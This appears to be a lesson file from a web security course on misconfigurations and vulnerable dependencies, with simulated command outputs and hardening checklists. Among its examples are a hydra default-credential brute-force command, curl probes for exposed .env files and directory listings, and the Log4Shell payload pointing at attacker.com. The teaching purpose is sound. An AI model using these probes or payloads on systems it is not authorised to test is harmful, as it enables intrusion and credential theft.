export const lesson = {
  id: 'L43',
  title: 'Security Misconfigurations & Vulnerable Components',
  slug: 'security-misconfigurations',
  type: 'PRACTICAL',
  duration: 45,
  xpReward: 35,
  difficulty: 'intermediate',
  module: { title: 'Web Application Security', slug: 'web-security' },
  course: { title: 'Web Security Fundamentals', slug: 'web-security-fundamentals' },
  keyTerms: [
    'Misconfiguration', 'Default Credentials', 'Directory Listing',
    'Debug Mode', 'Dependency Vulnerability', 'CVE',
    'npm audit', 'Dependabot', 'CIS Benchmark', 'Hardening'
  ],
  content: [
    { type: 'heading', content: 'Security Misconfigurations & Vulnerable Components' },
    { type: 'paragraph', content: 'Security misconfiguration is the "low-hanging fruit" that attackers look for first. Default passwords, unnecessary services, verbose error messages, and outdated software are easy to find and easy to exploit. Vulnerable components (outdated libraries with known CVEs) are equally dangerous — one unpatched dependency can compromise your entire application.' },


    { type: 'callout', variant: 'info', content: 'Analogy: Security misconfiguration is like building a fortress with a high-tech vault door... but leaving the back window open, the alarm system on "test mode," and the default password "1234" on the security cameras. The technology is there, but nobody configured it properly. Vulnerable components are like using a lock that the manufacturer recalled because anyone with a paperclip can open it — but you never got the recall notice.' },

    { type: 'heading', level: 2, content: 'Common Security Misconfigurations' },

    { type: 'heading', level: 3, content: '1. Default Credentials' },
    { type: 'paragraph', content: 'Devices and software ship with default usernames/passwords. Shockingly, many are never changed in production:' },
    { type: 'list', items: [
      'admin/admin — Routers, databases, admin panels',
      'root/root or root/(blank) — Linux systems, databases',
      'admin/password — Web application admin interfaces',
      'sa/(blank) — Microsoft SQL Server',
      'postgres/postgres — PostgreSQL default',
      'pi/raspberry — Raspberry Pi default',
      'Shodan.io shows millions of internet-facing devices with default credentials'
    ]},

    { type: 'command', command: 'hydra -L default_users.txt -P default_passwords.txt http-get://192.168.1.1/admin', output: `[80][http-get] host: 192.168.1.1   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found`, explanation: 'Testing for default credentials on a network device. Found admin/admin in seconds. First thing an attacker checks, first thing a defender should fix.' },

    { type: 'heading', level: 3, content: '2. Debug Mode in Production' },
    { type: 'command', command: 'curl "http://target.com/api/users/999" ', output: `{
  "error": "Unhandled exception",
  "stack": "TypeError: Cannot read property 'name' of undefined\\n    at /app/src/controllers/users.js:45:23\\n    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)\\n    at next (/app/node_modules/express/lib/router/route.js:144:13)",
  "environment": "production",
  "database": "postgresql://app_user:s3cr3t_passw0rd@10.0.1.100:5432/webapp",
  "node_version": "18.17.0",
  "express_version": "4.18.2"
}`, explanation: 'CRITICAL: Debug mode exposes: (1) Full stack trace revealing file paths. (2) Database connection string WITH PASSWORD. (3) Internal IP address (10.0.1.100). (4) Framework versions for targeted exploit research. Never enable debug in production!' },

    { type: 'heading', level: 3, content: '3. Directory Listing Enabled' },
    { type: 'command', command: 'curl "http://target.com/uploads/"', output: `<html><head><title>Index of /uploads/</title></head>
<body>
<h1>Index of /uploads/</h1>
<pre>
<a href="../">../</a>
<a href="backup_2024-01-15.sql.gz">backup_2024-01-15.sql.gz</a>   15-Jan-2024 03:00  245M
<a href="config.php.bak">config.php.bak</a>              12-Jun-2024 14:22   4K
<a href="id_rsa">id_rsa</a>                        01-Mar-2024 09:15   3K
<a href="employee_data.xlsx">employee_data.xlsx</a>         10-Jun-2024 16:45  12M
</pre></body></html>`, explanation: 'Directory listing reveals ALL files in the uploads directory. Found: database backup (245MB!), config backup (likely has credentials), SSH private key (!), and employee data. Disable directory listing in web server config.' },

    { type: 'heading', level: 3, content: '4. Unnecessary HTTP Methods' },
    { type: 'command', command: 'curl -X OPTIONS http://target.com/ -I', output: `HTTP/1.1 200 OK
Allow: GET, POST, PUT, DELETE, OPTIONS, TRACE, CONNECT
Server: Apache/2.4.52`, explanation: 'The server allows TRACE (can be used for Cross-Site Tracing attacks) and all modification methods. Most sites only need GET and POST. Disable unused methods in the server configuration.' },

    { type: 'heading', level: 3, content: '5. Exposed Configuration Files' },
    { type: 'command', command: 'curl "http://target.com/.env"', output: `DATABASE_URL=postgresql://admin:SuperSecret123@db.internal:5432/production
JWT_SECRET=my_jwt_secret_key_do_not_share
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_SECRET_KEY=sk_live_EXAMPLE_KEY_DO_NOT_USE_12345
SMTP_PASSWORD=email_password_123`, explanation: 'The .env file is publicly accessible! Contains database credentials, JWT secret (can forge tokens for any user), AWS keys (full cloud access), payment API keys (can process charges), and email credentials. This alone compromises the entire organization.' },

    { type: 'callout', variant: 'security', content: 'Exposed .env files are found on thousands of production sites. Always: (1) Add .env to .gitignore, (2) Block access to dotfiles in your web server config, (3) Use environment variables or secret managers instead of files, (4) Regularly scan your site for exposed files.' },

    { type: 'heading', level: 3, content: '6. Missing Security Headers' },
    { type: 'command', command: 'curl -I http://target.com', output: `HTTP/1.1 200 OK
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: PHP/8.1.2
Content-Type: text/html; charset=UTF-8`, explanation: 'Missing headers: No HSTS (can be downgraded to HTTP), no CSP (XSS unrestricted), no X-Frame-Options (clickjacking possible). Also LEAKING server version (Apache 2.4.52) and language (PHP 8.1.2) — attackers search for version-specific exploits.' },


    { type: 'heading', level: 2, content: 'Vulnerable & Outdated Components' },
    { type: 'paragraph', content: 'Modern applications use hundreds of third-party libraries. Each one is a potential attack vector if it has a known vulnerability (CVE) and isn\'t updated.' },

    { type: 'heading', level: 3, content: 'The Log4Shell Disaster (CVE-2021-44228)' },
    { type: 'paragraph', content: 'In December 2021, a critical vulnerability was discovered in Log4j — a logging library used by virtually every Java application. A single malicious string in any logged input (username, search query, User-Agent header) gave attackers Remote Code Execution.' },
    { type: 'list', items: [
      'Affected: Millions of applications — Minecraft, Apple iCloud, AWS, Twitter, Steam',
      'Severity: CVSS 10.0/10.0 (maximum possible)',
      'Exploitation: Send ${jndi:ldap://attacker.com/exploit} in any input field',
      'Impact: Full remote code execution on the server',
      'Lesson: Even "trusted" libraries can be catastrophic vulnerabilities'
    ]},

    { type: 'heading', level: 3, content: 'Scanning for Vulnerable Dependencies' },
    { type: 'command', command: 'npm audit', output: `# npm audit report

lodash  <4.17.21
Severity: critical
Prototype Pollution - https://github.com/advisories/GHSA-jf85-cpcp-j695
fix available via \`npm audit fix\`

express  <4.18.0
Severity: high
Open Redirect - https://github.com/advisories/GHSA-rv95-896h-c2yt
fix available via \`npm audit fix\`

jsonwebtoken  <9.0.0
Severity: moderate
Improper Verification - https://github.com/advisories/GHSA-hjrf-2m68-5959
fix available via \`npm audit fix --force\`

3 vulnerabilities (1 moderate, 1 high, 1 critical)`, explanation: 'npm audit checks all dependencies against a vulnerability database. Found: critical prototype pollution in lodash, open redirect in express, and JWT verification bypass. Running "npm audit fix" updates to patched versions.' },

    { type: 'command', command: 'pip-audit', output: `Found 2 known vulnerabilities in 2 packages
Name        Version  ID                  Fix Versions
----------  -------  ------------------  ------------
requests    2.25.0   PYSEC-2023-74       2.31.0
flask       2.0.1    CVE-2023-30861      2.3.2

Fix: pip install --upgrade requests flask`, explanation: 'Python dependency audit shows vulnerable versions of requests and Flask. Both have known CVEs with patches available. Update immediately.' },

    { type: 'heading', level: 3, content: 'Automated Dependency Monitoring' },
    { type: 'list', items: [
      'Dependabot (GitHub) — Automatically creates PRs to update vulnerable dependencies',
      'Snyk — Scans dependencies, containers, and IaC for vulnerabilities',
      'npm audit / pip-audit / bundle-audit — CLI tools for each ecosystem',
      'OWASP Dependency-Check — Multi-language scanner',
      'Renovate — Automated dependency update PRs with changelogs',
      'Set up automated scanning in CI/CD — fail builds on critical vulnerabilities'
    ]},

    { type: 'heading', level: 2, content: 'Hardening Checklist' },
    { type: 'paragraph', content: 'Systematic approach to fixing misconfigurations:' },

    { type: 'heading', level: 3, content: 'Web Server Hardening' },
    { type: 'command', command: 'cat /etc/nginx/conf.d/security.conf', output: `# Hide server version
server_tokens off;

# Security headers
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;

# Block access to sensitive files
location ~ /\\. {
    deny all;  # Block .env, .git, .htaccess, etc.
}

location ~ \\.(sql|bak|log|conf|ini)$ {
    deny all;  # Block backup and config files
}

# Disable directory listing
autoindex off;

# Limit request methods
if ($request_method !~ ^(GET|POST|HEAD)$) {
    return 405;
}`, explanation: 'Comprehensive nginx security configuration: hides version, adds all security headers, blocks sensitive files, disables directory listing, and restricts HTTP methods. Apply this to every production web server.' },

    { type: 'heading', level: 3, content: 'Application Hardening' },
    { type: 'list', items: [
      '☐ Disable debug/development mode in production',
      '☐ Remove default accounts and change default passwords',
      '☐ Disable unnecessary features, plugins, and services',
      '☐ Configure custom error pages (no stack traces or internal details)',
      '☐ Set secure cookie flags (HttpOnly, Secure, SameSite)',
      '☐ Implement rate limiting on all endpoints',
      '☐ Remove commented-out code and TODO markers before deployment',
      '☐ Validate all Content-Type headers',
      '☐ Set appropriate CORS policies (not Access-Control-Allow-Origin: *)',
      '☐ Keep all frameworks and dependencies updated'
    ]},

    { type: 'heading', level: 2, content: 'Automated Configuration Scanning' },
    { type: 'command', command: 'docker run --rm -v /app:/app aquasec/trivy fs /app', output: `2024-06-15T11:00:00Z INFO Vulnerability scanning...
/app/package-lock.json (npm)
Total: 5 (CRITICAL: 1, HIGH: 2, MEDIUM: 2)

┌───────────────┬────────────────┬──────────┬───────────────────┐
│   Library     │ Vulnerability  │ Severity │ Fixed Version     │
├───────────────┼────────────────┼──────────┼───────────────────┤
│ lodash        │ CVE-2021-23337 │ CRITICAL │ 4.17.21           │
│ axios         │ CVE-2023-45857 │ HIGH     │ 1.6.0             │
│ express       │ CVE-2024-29041 │ HIGH     │ 4.19.2            │
│ semver        │ CVE-2022-25883 │ MEDIUM   │ 7.5.2             │
│ cookie        │ CVE-2024-47764 │ MEDIUM   │ 0.7.0             │
└───────────────┴────────────────┴──────────┴───────────────────┘`, explanation: 'Trivy scans your entire application filesystem for vulnerable dependencies. Integrate this in CI/CD to catch vulnerabilities before deployment. Fix critical and high findings immediately.' },

    { type: 'heading', level: 2, content: 'Summary & Security Implications' },
    { type: 'list', items: [
      'Misconfigurations are the easiest vulnerabilities to find AND fix — no excuse for leaving them',
      'Change ALL default credentials immediately upon installation',
      'Never enable debug mode in production — it leaks critical information',
      'Block access to .env, .git, backup files, and enable no directory listing',
      'Add security headers to every response (HSTS, CSP, X-Frame-Options)',
      'Automate dependency scanning — vulnerabilities are discovered daily',
      'Update dependencies regularly — especially when critical CVEs are published',
      'Use tools: npm audit, Trivy, Dependabot, Snyk for continuous monitoring',
      'Follow CIS Benchmarks for systematic hardening of servers and services',
      'Configuration drift happens — rescan regularly, not just once during setup'
    ]},
  ],
  navigation: {
    prev: { title: 'Broken Access Control & IDOR', slug: 'broken-access-control' },
    next: { title: 'Symmetric Encryption: AES & Block Ciphers', slug: 'symmetric-encryption' },
  },
};
